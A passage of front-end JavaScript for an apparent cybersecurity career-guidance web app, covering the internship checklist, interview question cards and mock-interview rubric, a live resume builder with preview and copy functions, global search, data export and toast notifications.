          <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--accent-green); margin-bottom: 0.4rem;">ATS-Optimized Resume Accomplishment Bullets</h4>
          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.5rem;">Copy these quantifiable bullet points directly into your Resume Assistant form:</p>
          <ul style="padding-left: 1.25rem; color: var(--text-secondary); display: flex; flex-direction: column; gap: 0.45rem;">
            ${p.highlights.map(h => `<li>${h}</li>`).join('')}
          </ul>
        </div>

        <div style="background: var(--bg-surface); padding: 0.85rem; border-radius: 4px; border: 1px dashed var(--border-light); font-size: 0.8rem; color: var(--text-muted);">
          <strong>GitHub Portfolio Tip:</strong> Create a public repo named <code>${p.id}-cyber-lab</code>, include a network topology diagram PNG, and link the repository URL directly in your resume header.
        </div>
      `;
    }

    if (modal) modal.classList.remove('hidden');
  }

  renderInternshipChecklist() {
    const container = document.getElementById('internship-checklist-container');
    if (!container) return;

    const checked = this.state.data.internshipChecks || [];
    let html = '';

    INTERNSHIP_CHECKLIST_DATA.forEach(item => {
      const isDone = checked.includes(item.id);
      html += `
        <div class="check-item-row ${isDone ? 'done' : ''}">
          <input type="checkbox" id="chk_${item.id}" ${isDone ? 'checked' : ''} onchange="app.toggleInternshipCheck('${item.id}')">
          <label for="chk_${item.id}">${item.text}</label>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  toggleInternshipCheck(id) {
    const list = this.state.data.internshipChecks;
    const index = list.indexOf(id);
    if (index > -1) {
      list.splice(index, 1);
    } else {
      list.push(id);
    }
    this.state.save();
    this.renderInternshipChecklist();
  }

  // -----------------------------------------------------------------
  // 3.8 Interview Preparation & Simulator
  // -----------------------------------------------------------------
  renderInterviewPrep() {
    this.renderInterviewQuestions();
    this.loadMockScenario();
  }

  switchInterviewTab(tab) {
    this.selectedInterviewTab = tab;
    const questionsMode = document.getElementById('interview-questions-mode');
    const simulatorMode = document.getElementById('interview-simulator-mode');
    const tabBtnQ = document.getElementById('tab-btn-questions');
    const tabBtnS = document.getElementById('tab-btn-simulator');

    if (tab === 'questions') {
      if (questionsMode) questionsMode.classList.remove('hidden');
      if (simulatorMode) simulatorMode.classList.add('hidden');
      if (tabBtnQ) tabBtnQ.classList.add('active');
      if (tabBtnS) tabBtnS.classList.remove('active');
    } else {
      if (questionsMode) questionsMode.classList.add('hidden');
      if (simulatorMode) simulatorMode.classList.remove('hidden');
      if (tabBtnQ) tabBtnQ.classList.remove('active');
      if (tabBtnS) tabBtnS.classList.add('active');
    }
  }

  renderInterviewQuestions(filter = 'all', query = '') {
    const container = document.getElementById('interview-cards-container');
    if (!container) return;

    // Filter tabs
    const tabs = document.querySelectorAll('.filter-tab[data-int-filter]');
    tabs.forEach(tab => {
      tab.onclick = () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        this.renderInterviewQuestions(tab.getAttribute('data-int-filter'), query);
      };
    });

    // Search bar
    const searchInput = document.getElementById('interview-search-input');
    if (searchInput) {
      searchInput.oninput = (e) => {
        this.renderInterviewQuestions(filter, e.target.value.toLowerCase().trim());
      };
    }

    const filtered = INTERVIEW_QUESTIONS.filter(q => {
      const matchCat = (filter === 'all') || (q.category === filter);
      const qLow = query.toLowerCase();
      const matchSearch = !qLow || (
        q.question.toLowerCase().includes(qLow) ||
        q.answer.toLowerCase().includes(qLow) ||
        q.categoryLabel.toLowerCase().includes(qLow)
      );
      return matchCat && matchSearch;
    });

    if (filtered.length === 0) {
      container.innerHTML = '<div style="grid-column: 1/-1; padding: 2rem; text-align: center; color: var(--text-muted);">No interview questions match your filter.</div>';
      return;
    }

    let html = '';
    filtered.forEach(q => {
      html += `
        <div class="interview-card" id="int-card-${q.id}">
          <div class="int-card-header">
            <span class="int-domain-chip">${q.categoryLabel}</span>
            <span class="int-diff-chip">${q.difficulty}</span>
          </div>
          <h4 class="int-question-text">${q.question}</h4>
          <button class="btn btn-sm btn-outline" onclick="app.toggleInterviewAnswer('${q.id}')">
            Reveal Answer & Key Points &darr;
          </button>
          <div class="int-answer-drawer" id="int-ans-${q.id}">
            <div style="white-space: pre-line;">${q.answer}</div>
          </div>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  toggleInterviewAnswer(id) {
    const drawer = document.getElementById(`int-ans-${id}`);
    if (drawer) {
      drawer.classList.toggle('open');
    }
  }

  loadMockScenario() {
    const select = document.getElementById('mock-role-selector');
    const selectedKey = select ? select.value : 'soc';
    const scenario = MOCK_SCENARIOS[selectedKey] || MOCK_SCENARIOS.soc;

    const titleEl = document.getElementById('mock-scenario-title');
    const descEl = document.getElementById('mock-scenario-desc');
    const textarea = document.getElementById('mock-user-answer');
    const rubricBox = document.getElementById('mock-rubric-box');

    if (titleEl) titleEl.textContent = scenario.title;
    if (descEl) descEl.textContent = scenario.desc;
    if (textarea) textarea.value = '';
    if (rubricBox) rubricBox.classList.add('hidden');
  }

  evaluateMockAnswer() {
    const textarea = document.getElementById('mock-user-answer');
    const select = document.getElementById('mock-role-selector');
    const rubricBox = document.getElementById('mock-rubric-box');
    const checkpointsList = document.getElementById('mock-checkpoints-list');
    const idealAnswerEl = document.getElementById('mock-ideal-answer');

    if (!textarea || !rubricBox) return;

    const userText = textarea.value.trim();
    if (!userText) {
      this.showToast('Please draft your structured response before checking the rubric.', 'error');
      return;
    }

    const selectedKey = select ? select.value : 'soc';
    const scenario = MOCK_SCENARIOS[selectedKey] || MOCK_SCENARIOS.soc;

    // Render interactive rubric checkpoints
    if (checkpointsList) {
      checkpointsList.innerHTML = scenario.rubricPoints.map((point, i) => `
        <div class="rubric-item">
          <input type="checkbox" id="rubric_chk_${i}" style="margin-top: 3px;">
          <label for="rubric_chk_${i}">${point}</label>
        </div>
      `).join('');
    }

    if (idealAnswerEl) {
      idealAnswerEl.textContent = scenario.idealAnswer;
    }

    rubricBox.classList.remove('hidden');
    rubricBox.scrollIntoView({ behavior: 'smooth' });
    this.showToast('Self-evaluation rubric loaded. Check all key points covered in your answer.', 'info');
  }

  // -----------------------------------------------------------------
  // 3.9 Resume and Portfolio Assistant
  // -----------------------------------------------------------------
  initResumeAssistant() {
    const form = document.getElementById('resume-builder-form');
    if (!form) return;

    // Populate inputs from saved state
    this.populateResumeForm();

    // Listen to real-time input events on the form
    form.addEventListener('input', () => {
      this.syncResumeStateFromForm();
      this.updateResumePreview();
    });
  }

  populateResumeForm() {
    const r = this.state.data.resume;
    const setVal = (id, val) => {
      const el = document.getElementById(id);
      if (el) el.value = val || '';
    };

    setVal('res-name', r.name);
    setVal('res-title', r.title);
    setVal('res-email', r.email);
    setVal('res-phone', r.phone);
    setVal('res-linkedin', r.linkedin);
    setVal('res-summary', r.summary);
    setVal('res-degree', r.degree);
    setVal('res-university', r.university);
    setVal('res-coursework', r.coursework);
    setVal('res-skills-tools', r.skillsTools);
    setVal('res-skills-os', r.skillsOS);
    setVal('res-skills-scripting', r.skillsScripting);
    setVal('res-certifications', r.certifications);
    setVal('res-projects', r.projects);
    setVal('res-experience', r.experience);

    this.updateResumePreview();
  }

  syncResumeStateFromForm() {
    const getVal = (id) => {
      const el = document.getElementById(id);
      return el ? el.value : '';
    };

    this.state.data.resume = {
      name: getVal('res-name'),
      title: getVal('res-title'),
      email: getVal('res-email'),
      phone: getVal('res-phone'),
      linkedin: getVal('res-linkedin'),
      summary: getVal('res-summary'),
      degree: getVal('res-degree'),
      university: getVal('res-university'),
      coursework: getVal('res-coursework'),
      skillsTools: getVal('res-skills-tools'),
      skillsOS: getVal('res-skills-os'),
      skillsScripting: getVal('res-skills-scripting'),
      certifications: getVal('res-certifications'),
      projects: getVal('res-projects'),
      experience: getVal('res-experience')
    };

    this.state.save();
  }

  updateResumePreview() {
    const r = this.state.data.resume;

    const setText = (id, text) => {
      const el = document.getElementById(id);
      if (el) el.textContent = text || '';
    };

    setText('sheet-name', r.name || 'Your Full Name');
    setText('sheet-title', r.title || 'Cybersecurity Professional');

    // Header contact
    const contactParts = [r.email, r.phone, r.linkedin].filter(Boolean);
    setText('sheet-contact', contactParts.join(' • '));

    setText('sheet-summary', r.summary || 'Enter your professional summary in the form on the left.');
    setText('sheet-skills-tools', r.skillsTools || 'N/A');
    setText('sheet-skills-os', r.skillsOS || 'N/A');
    setText('sheet-skills-scripting', r.skillsScripting || 'N/A');

    // Certifications
    const certsContainer = document.getElementById('sheet-certifications');
    if (certsContainer) {
      const lines = (r.certifications || '').split('\n').filter(l => l.trim().length > 0);
      certsContainer.innerHTML = lines.length > 0
        ? lines.map(line => `<div>&bull; ${line.trim()}</div>`).join('')
        : '<div>&bull; CompTIA Security+ (In Progress)</div>';
    }

    // Projects (parse title and bullet lines)
    const projectsContainer = document.getElementById('sheet-projects');
    if (projectsContainer) {
      projectsContainer.innerHTML = this.formatMultiParagraphBullets(r.projects);
    }

    // Experience
    const expContainer = document.getElementById('sheet-experience');
    const expSection = document.getElementById('sheet-exp-section');
    if (expContainer) {
      if (!r.experience || r.experience.trim().length === 0) {
        if (expSection) expSection.style.display = 'none';
      } else {
        if (expSection) expSection.style.display = 'block';
        expContainer.innerHTML = this.formatMultiParagraphBullets(r.experience);
      }
    }

    // Education
    setText('sheet-degree', r.degree || 'Degree Program');
    setText('sheet-university', r.university || 'University Name & Expected Date');
    setText('sheet-coursework', r.coursework || 'Core Security Coursework');
  }

  formatMultiParagraphBullets(rawText) {
    if (!rawText) return '<div>No details entered.</div>';
    const blocks = rawText.split('\n\n').filter(b => b.trim().length > 0);
    let html = '';

    blocks.forEach(block => {
      const lines = block.split('\n').map(l => l.trim()).filter(l => l.length > 0);
      if (lines.length > 0) {
        const titleLine = lines[0];
        const bullets = lines.slice(1);
        html += `
          <div class="sheet-project-item">
            <div class="sheet-item-title-row">
              <strong>${titleLine}</strong>
            </div>
            ${bullets.length > 0 ? `
              <ul class="sheet-bullets">
                ${bullets.map(b => `<li>${b.replace(/^[•\-\*]\s*/, '')}</li>`).join('')}
              </ul>
            ` : ''}
          </div>
        `;
      }
    });

    return html;
  }

  applyObjectiveTemplate(roleKey) {
    const summaryInput = document.getElementById('res-summary');
    if (!summaryInput) return;

    const templates = {
      soc: 'Diligent cybersecurity senior with hands-on expertise in SIEM log monitoring, alert correlation, and network packet analysis. Skilled with Splunk, Wireshark, and Python scripting. Seeking to leverage incident handling and defensive lab experience in an entry-level SOC Analyst position.',
      pentest: 'Detail-oriented cybersecurity graduate with practical offensive security laboratory experience in vulnerability enumeration, exploit analysis, and web security testing. Proficient with Burp Suite, Nmap, and Metasploit. Eager to contribute rigorous ethical hacking and reporting skills as a Junior Penetration Tester.',
      student: 'Motivated information security student equipped with strong foundations in computer networking, Linux systems, and security architecture. Adept at rapid technical learning, threat modeling, and collaborating in team environments to protect critical digital infrastructure.'
    };

    summaryInput.value = templates[roleKey] || templates.soc;
    this.syncResumeStateFromForm();
    this.updateResumePreview();
    this.showToast('Applied objective template!', 'info');
  }

  loadSampleResumeData() {
    this.state.loadDemoStudent();
    this.populateResumeForm();
    this.showToast('Loaded demo student profile (Alex Morgan)', 'success');
  }

  clearResumeForm() {
    this.state.data.resume = {
      name: '', title: '', email: '', phone: '', linkedin: '',
      summary: '', degree: '', university: '', coursework: '',
      skillsTools: '', skillsOS: '', skillsScripting: '',
      certifications: '', projects: '', experience: ''
    };
    this.state.save();
    this.populateResumeForm();
    this.showToast('Cleared resume form.', 'info');
  }

  copyResumePlainText() {
    const r = this.state.data.resume;
    const text = `
${r.name.toUpperCase()}
${r.title}
${r.email} | ${r.phone} | ${r.linkedin}

PROFESSIONAL SUMMARY
${r.summary}

TECHNICAL COMPETENCIES
- Security Tools: ${r.skillsTools}
- Operating Systems & Cloud: ${r.skillsOS}
- Programming & Protocols: ${r.skillsScripting}

CERTIFICATIONS
${r.certifications}

PROJECTS & LABS
${r.projects}

${r.experience ? `EXPERIENCE\n${r.experience}\n` : ''}
EDUCATION
${r.degree}
${r.university}
Relevant Coursework: ${r.coursework}
    `.trim();

    navigator.clipboard.writeText(text);
    this.showToast('Copied clean plain text resume to clipboard!', 'success');
  }

  // -----------------------------------------------------------------
  // 3.10 Quick Global Search & Keyboard Shortcuts
  // -----------------------------------------------------------------
  initGlobalSearch() {
    const searchInput = document.getElementById('global-search-input');
    const dropdown = document.getElementById('search-results-dropdown');
    if (!searchInput || !dropdown) return;

    searchInput.addEventListener('input', (e) => {
      const q = e.target.value.toLowerCase().trim();
      if (!q) {
        dropdown.classList.add('hidden');
        return;
      }

      const results = [];

      // Search careers
      CAREERS_DATA.forEach(c => {
        if (c.title.toLowerCase().includes(q) || c.skills.some(s => s.toLowerCase().includes(q))) {
          results.push({
            type: 'Career Specialization',
            title: c.title,
            meta: `${c.categoryLabel} • Click to explore`,
            action: () => {
              this.navigateTo('careers');
              this.openCareerModal(c.id);
            }
          });
        }
      });

      // Search roadmap topics
      ROADMAP_MODULES.forEach(m => {
        m.topics.forEach(t => {
          if (t.title.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q)) {
            results.push({
              type: 'Learning Roadmap Lesson',
              title: t.title,
              meta: `Module: ${m.title}`,
              action: () => {
                this.navigateTo('roadmap');
                const card = document.getElementById(`module-card-${m.id}`);
                if (card) {
                  card.classList.add('open');
                  card.scrollIntoView({ behavior: 'smooth' });
                }
              }
            });
          }
        });
      });

      // Search interview questions
      INTERVIEW_QUESTIONS.forEach(iq => {
        if (iq.question.toLowerCase().includes(q) || iq.answer.toLowerCase().includes(q)) {
          results.push({
            type: 'Interview Question',
            title: iq.question,
            meta: `${iq.categoryLabel} • ${iq.difficulty}`,
            action: () => {
              this.navigateTo('interview');
              this.switchInterviewTab('questions');
              this.toggleInterviewAnswer(iq.id);
            }
          });
        }
      });

      if (results.length === 0) {
        dropdown.innerHTML = '<div style="padding: 1rem; font-size: 0.85rem; color: var(--text-muted); text-align: center;">No matching careers, roadmap topics, or interview questions found.</div>';
        dropdown.classList.remove('hidden');
        return;
      }

      dropdown.innerHTML = results.slice(0, 8).map((res, i) => `
        <div class="search-result-item" id="search-item-${i}">
          <div>
            <div style="font-size: 0.88rem; font-weight: 600; color: var(--text-main);">${res.title}</div>
            <div class="search-result-meta">${res.meta}</div>
          </div>
          <span style="font-size: 0.74rem; color: var(--accent-cyan); font-family: var(--font-mono);">${res.type} &rarr;</span>
        </div>
      `).join('');

      dropdown.classList.remove('hidden');

      // Bind click handlers to items
      results.slice(0, 8).forEach((res, i) => {
        const itemEl = document.getElementById(`search-item-${i}`);
        if (itemEl) {
          itemEl.onclick = () => {
            dropdown.classList.add('hidden');
            searchInput.value = '';
            res.action();
          };
        }
      });
    });

    // Close on outside click
    document.addEventListener('click', (e) => {
      if (!searchInput.contains(e.target) && !dropdown.contains(e.target)) {
        dropdown.classList.add('hidden');
      }
    });
  }

  initKeyboardShortcuts() {
    window.addEventListener('keydown', (e) => {
      // Ctrl+K or Cmd+K focuses search
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
        e.preventDefault();
        const searchInput = document.getElementById('global-search-input');
        if (searchInput) searchInput.focus();
      }
      // Escape closes modals
      if (e.key === 'Escape') {
        this.closeCareerModal();
        this.closeDataModal();
        const dropdown = document.getElementById('search-results-dropdown');
        if (dropdown) dropdown.classList.add('hidden');
      }
    });
  }

  // -----------------------------------------------------------------
  // 3.11 Storage Dialog, Export & Reset
  // -----------------------------------------------------------------
  openDataModal() {
    const modal = document.getElementById('data-options-modal');
    if (modal) modal.classList.remove('hidden');
  }

  closeDataModal() {
    const modal = document.getElementById('data-options-modal');
    if (modal) modal.classList.add('hidden');
  }

  exportDataJSON() {
    const jsonStr = JSON.stringify(this.state.data, null, 2);
    const blob = new Blob([jsonStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `CyberCareer_AI_Backup_${new Date().toISOString().slice(0, 10)}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    this.showToast('Exported JSON session backup.', 'success');
  }

  confirmResetAll() {
    if (confirm('Are you sure you want to reset all stored progress, assessment scores, and resume fields? This action cannot be undone.')) {
      this.state.resetAll();
      this.populateResumeForm();
      this.renderDashboard();
      this.renderSidebar();
      this.renderCareers();
      this.renderRoadmap();
      this.renderInterviewPrep();
      this.renderQuizQuestion(0);
      this.showToast('All stored session data reset.', 'info');
    }
  }

  loadDemoStudentData() {
    this.state.loadDemoStudent();
    this.populateResumeForm();
    this.renderDashboard();
    this.renderSidebar();
    this.renderCareers();
    this.renderRoadmap();
    this.renderInterviewPrep();
    this.displayAssessmentResults(this.state.data.assessment);
    this.showToast('Loaded demo student profile and progress!', 'success');
  }

  // -----------------------------------------------------------------
  // 3.12 Toast Notifications
  // -----------------------------------------------------------------
  showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;

    let icon = 'ℹ️';
    if (type === 'success') icon = '✓';
    if (type === 'error') icon = '⚠';

    toast.innerHTML = `<span>${icon}</span><span>${message}</span>`;
    container.appendChild(toast);

    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateY(8px)';
      toast.style.transition = 'all 0.3s ease';
      setTimeout(() => {
        if (container.contains(toast)) container.removeChild(toast);
      }, 300);
    }, 3200);
  }
}

// -------------------------------------------------------------------
// 4. Initialize Application on DOM Ready
// -------------------------------------------------------------------
let app;
document.addEventListener('DOMContentLoaded', () => {
  app = new CyberCareerApp();
  window.app = app; // Expose globally for inline event triggers
});
